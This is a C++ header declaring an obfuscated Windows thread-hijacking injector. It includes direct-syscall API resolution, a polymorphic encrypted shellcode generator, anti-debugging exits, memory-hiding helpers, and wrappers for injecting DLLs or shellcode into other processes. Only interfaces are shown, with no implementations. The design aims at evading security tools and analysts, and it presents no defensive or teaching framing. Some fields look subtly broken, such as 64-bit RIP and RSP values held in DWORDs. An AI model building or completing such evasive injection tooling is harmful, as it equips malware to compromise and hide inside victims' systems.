#pragma once
#ifndef THREAD_HIJACK_OBFUSCATED_H
#define THREAD_HIJACK_OBFUSCATED_H

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <vector>
#include "AntiDebug.h"

// =============================================================================
// SECTION 1: Native API Definitions (NTDLL)
// =============================================================================

// NtQueryInformationProcess
typedef NTSTATUS(NTAPI* NtQueryInformationProcess_t)(
    HANDLE ProcessHandle,
    DWORD ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

// NtQuerySystemInformation
typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

// NtAllocateVirtualMemory
typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

// NtWriteVirtualMemory
typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

// NtReadVirtualMemory
typedef NTSTATUS(NTAPI* NtReadVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToRead,
    PSIZE_T NumberOfBytesRead
);

// NtGetContextThread
typedef NTSTATUS(NTAPI* NtGetContextThread_t)(
    HANDLE ThreadHandle,
    PCONTEXT ThreadContext
);

// NtSetContextThread
typedef NTSTATUS(NTAPI* NtSetContextThread_t)(
    HANDLE ThreadHandle,
    PCONTEXT ThreadContext
);

// NtResumeThread
typedef NTSTATUS(NTAPI* NtResumeThread_t)(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount
);

// NtSuspendThread
typedef NTSTATUS(NTAPI* NtSuspendThread_t)(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount
);

// NtOpenProcess
typedef NTSTATUS(NTAPI* NtOpenProcess_t)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    PVOID ClientId
);

// NtCreateThreadEx
typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

// NtClose
typedef NTSTATUS(NTAPI* NtClose_t)(
    HANDLE Handle
);

// NtWaitForSingleObject
typedef NTSTATUS(NTAPI* NtWaitForSingleObject_t)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
);

// =============================================================================
// SECTION 2: Syscall Stub Generator
// =============================================================================

// Syscall numbers for different Windows versions
// These will be resolved at runtime
struct SyscallInfo {
    DWORD NtAllocateVirtualMemory;
    DWORD NtWriteVirtualMemory;
    DWORD NtReadVirtualMemory;
    DWORD NtGetContextThread;
    DWORD NtSetContextThread;
    DWORD NtResumeThread;
    DWORD NtSuspendThread;
    DWORD NtOpenProcess;
    DWORD NtCreateThreadEx;
    DWORD NtClose;
    DWORD NtWaitForSingleObject;
    DWORD NtQueryInformationProcess;
};

// =============================================================================
// SECTION 3: Dynamic API Resolver
// =============================================================================

// PEB-based module enumeration
struct ModuleInfo {
    PVOID BaseAddress;
    DWORD SizeOfImage;
    UNICODE_STRING FullDllName;
};

class DynamicAPIResolver {
private:
    // Cached function pointers
    NtAllocateVirtualMemory_t pNtAllocateVirtualMemory;
    NtWriteVirtualMemory_t pNtWriteVirtualMemory;
    NtReadVirtualMemory_t pNtReadVirtualMemory;
    NtGetContextThread_t pNtGetContextThread;
    NtSetContextThread_t pNtSetContextThread;
    NtResumeThread_t pNtResumeThread;
    NtSuspendThread_t pNtSuspendThread;
    NtOpenProcess_t pNtOpenProcess;
    NtCreateThreadEx_t pNtCreateThreadEx;
    NtClose_t pNtClose;
    NtWaitForSingleObject_t pNtWaitForSingleObject;
    NtQueryInformationProcess_t pNtQueryInformationProcess;
    
    // Initialize all function pointers
    void init();
    
    // Resolve function from module
    PVOID resolveFunction(HMODULE module, LPCSTR functionName);
    
public:
    DynamicAPIResolver();
    ~DynamicAPIResolver();
    
    // Get module base from PEB
    static PVOID GetModuleBase(LPCWSTR moduleName);
    
    // Get function address via PEB walk
    static PVOID GetProcAddressObf(PVOID moduleBase, LPCSTR functionName);
    
    // Direct syscall wrappers
    NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress,
        ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
    
    NTSTATUS NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
        PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
    
    NTSTATUS NtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress,
        PVOID Buffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead);
    
    NTSTATUS NtGetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext);
    NTSTATUS NtSetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext);
    NTSTATUS NtResumeThread(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
    NTSTATUS NtSuspendThread(HANDLE ThreadHandle, PULONG PreviousSuspendCount);
    
    NTSTATUS NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess,
        PVOID ObjectAttributes, PVOID ClientId);
    
    NTSTATUS NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
        PVOID ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine,
        PVOID Argument, ULONG CreateFlags, ULONG ZeroBits, SIZE_T StackSize,
        SIZE_T MaximumStackSize, PVOID AttributeList);
    
    NTSTATUS NtClose(HANDLE Handle);
    NTSTATUS NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
};

// =============================================================================
// SECTION 4: Shellcode Generator (Polymorphic)
// =============================================================================

// Shellcode types for thread hijacking
enum ShellcodeType : BYTE {
    SHELLCODE_SIMPLE_CALL,      // Simple function call via jmp
    SHELLCODE_SETRIP_EXECUTE,   // Set RIP and execute
    SHELLCODE_STACK_PIVOT,      // Stack pivot + execute
    SHELLCODE_INDIRECT_CALL     // Indirect call via register
};

// Shellcode context
struct ShellcodeContext {
    PVOID targetAddress;        // Address to execute
    PVOID parameter;            // Parameter to pass
    DWORD originalRip;           // Original instruction pointer
    DWORD originalRsp;          // Original stack pointer
};

// Polymorphic shellcode generator
class PolymorphicShellcodeGenerator {
private:
    // Encryption key
    DWORD xorKey;
    
    // Generate random XOR key
    DWORD generateKey();
    
    // Encrypt shellcode with XOR
    void encryptXOR(BYTE* data, DWORD size, DWORD key);
    
    // Decrypt shellcode with XOR
    void decryptXOR(BYTE* data, DWORD size, DWORD key);
    
    // Generate simple call shellcode (x64)
    std::vector<BYTE> genSimpleCallx64(PVOID target, PVOID param);
    
    // Generate set RIP shellcode (x64)
    std::vector<BYTE> genSetRipx64(PVOID target, PVOID param);
    
    // Generate stack pivot shellcode (x64)
    std::vector<BYTE> genStackPivotx64(PVOID target, PVOID param, DWORD stackSize);
    
    // Generate indirect call shellcode (x64)
    std::vector<BYTE> genIndirectCallx64(PVOID target, PVOID param);
    
    // Generate x86 variants
    std::vector<BYTE> genSimpleCallx86(PVOID target, PVOID param);
    std::vector<BYTE> genSetRipx86(PVOID target, PVOID param);
    std::vector<BYTE> genStackPivotx86(PVOID target, PVOID param, DWORD stackSize);
    std::vector<BYTE> genIndirectCallx86(PVOID target, PVOID param);
    
    // Insert junk instructions
    void insertJunkCode(std::vector<BYTE>& buffer);
    
public:
    PolymorphicShellcodeGenerator();
    
    // Generate polymorphic shellcode
    std::vector<BYTE> generate(PVOID target, PVOID param, ShellcodeType type);
    
    // Decrypt shellcode before execution
    void decrypt(std::vector<BYTE>& shellcode);
    
    // Encrypt shellcode after execution
    void encrypt(std::vector<BYTE>& shellcode);
    
    // Get current key
    DWORD getKey() const { return xorKey; }
    
    // Set encryption key
    void setKey(DWORD key) { xorKey = key; }
};

// =============================================================================
// SECTION 5: Thread Hijacking Engine
// =============================================================================

// Thread hijacking result
struct HijackResult {
    BOOL success;
    DWORD errorCode;
    HANDLE hProcess;
    HANDLE hThread;
    DWORD originalRip;
    PVOID payloadAddress;
};

// Thread state for hijacking
enum ThreadState : DWORD {
    STATE_INITIAL,
    STATE_SUSPENDED,
    STATE_CONTEXT_SAVED,
    STATE_PAYLOAD_INJECTED,
    STATE_RESUMED,
    STATE_COMPLETED
};

// Main thread hijacking class
class ObfuscatedThreadHijacker {
private:
    DynamicAPIResolver apiResolver;
    PolymorphicShellcodeGenerator shellcodeGen;
    
    // Thread state
    ThreadState state;
    HijackResult lastResult;
    
    // Anti-debug check
    bool checkAntiDebug();
    
    // Save original thread context
    NTSTATUS saveThreadContext(HANDLE hThread, CONTEXT* ctx);
    
    // Restore original thread context
    NTSTATUS restoreThreadContext(HANDLE hThread, CONTEXT* ctx);
    
    // Inject shellcode into process
    PVOID injectShellcode(HANDLE hProcess, const BYTE* shellcode, DWORD size);
    
    // Free injected shellcode
    BOOL freeShellcode(HANDLE hProcess, PVOID address);
    
public:
    ObfuscatedThreadHijacker();
    ~ObfuscatedThreadHijacker();
    
    // Main hijack function - inject and execute payload in target thread
    HijackResult hijackThread(DWORD targetPid, DWORD targetTid, 
                              PVOID payloadAddress, PVOID payloadParam);
    
    // Hijack using existing thread
    HijackResult hijackExistingThread(DWORD targetTid,
                                     PVOID payloadAddress, PVOID payloadParam);
    
    // Create and hijack new suspended process
    HijackResult hijackNewProcess(LPCWSTR processPath,
                                  PVOID payloadAddress, PVOID payloadParam);
    
    // Restore thread to original state
    BOOL restoreThread(DWORD targetTid);
    
    // Wait for payload completion
    DWORD waitForCompletion(DWORD timeout = INFINITE);
    
    // Get last hijack result
    HijackResult getLastResult() const { return lastResult; }
    
    // Get thread state
    ThreadState getState() const { return state; }
};

// =============================================================================
// SECTION 6: Wrapper Functions for Easy Use
// =============================================================================

namespace ThreadHijack {
    
    // Simple DLL injection via thread hijacking
    BOOL injectDll(DWORD targetPid, LPCWSTR dllPath);
    
    // Simple shellcode execution via thread hijacking
    BOOL executeShellcode(DWORD targetPid, const BYTE* shellcode, DWORD size);
    
    // Create suspended process and inject
    DWORD createAndInject(LPCWSTR processPath, LPCWSTR dllPath);
    
    // Create and inject with callback
    DWORD createAndInjectEx(LPCWSTR processPath, LPCWSTR dllPath, 
                           BOOL(*callback)(HANDLE hProcess, HANDLE hThread));
}

// =============================================================================
// SECTION 7: Memory Obfuscation Utilities
// =============================================================================

namespace MemObf {
    
    // Encrypt memory region
    void encryptMemory(PVOID address, SIZE_T size, DWORD key);
    
    // Decrypt memory region
    void decryptMemory(PVOID address, SIZE_T size, DWORD key);
    
    // Allocate and encrypt
    PVOID allocEncrypted(HANDLE hProcess, SIZE_T size, DWORD key);
    
    // Write encrypted memory
    BOOL writeEncrypted(HANDLE hProcess, PVOID address, 
                        const void* data, SIZE_T size, DWORD key);
    
    // Self-decrypting memory allocation
    PVOID allocSelfDecrypting(HANDLE hProcess, SIZE_T size, PVOID executableCode);
    
    // Remove memory protection (make it harder to analyze)
    BOOL hideMemory(HANDLE hProcess, PVOID address, SIZE_T size);
    
    // Check if memory region is valid
    BOOL isValidMemoryRegion(PVOID address, SIZE_T size);
}

// =============================================================================
// SECTION 8: Export Table Parser
// =============================================================================

// Export directory entry
struct ExportEntry {
    DWORD ordinal;
    PVOID address;
    LPCSTR name;
};

// Parse export table
class ExportTableParser {
private:
    PVOID moduleBase;
    IMAGE_EXPORT_DIRECTORY* exportDir;
    DWORD* functionNames;
    DWORD* functionAddresses;
    WORD* functionOrdinals;
    DWORD numFunctions;
    
public:
    ExportTableParser(PVOID base);
    ~ExportTableParser();
    
    // Find function by name
    PVOID findByName(LPCSTR functionName);
    
    // Find function by ordinal
    PVOID findByOrdinal(DWORD ordinal);
    
    // Get all exports
    std::vector<ExportEntry> getAllExports();
};

// =============================================================================
// SECTION 9: Obfuscation Macros
// =============================================================================

// Macro to call Nt* function with obfuscation
#define OBF_CALL_NT(function, ...) \
    do { \
        if (AntiDebug::QuickDebugCheck()) { \
            ExitProcess(0xFFFFFFFF); \
        } \
        DynamicAPIResolver resolver; \
        return resolver.function(__VA_ARGS__); \
    } while(0)

#endif // THREAD_HIJACK_OBFUSCATED_H
